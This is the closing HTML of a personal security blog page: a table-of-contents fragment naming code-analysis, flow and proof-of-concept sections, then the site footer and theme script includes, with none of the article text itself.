    <li><a href="#code-analysis">Code Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/js/config/2209da85175e5fcd66035580cdd2a7ef.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
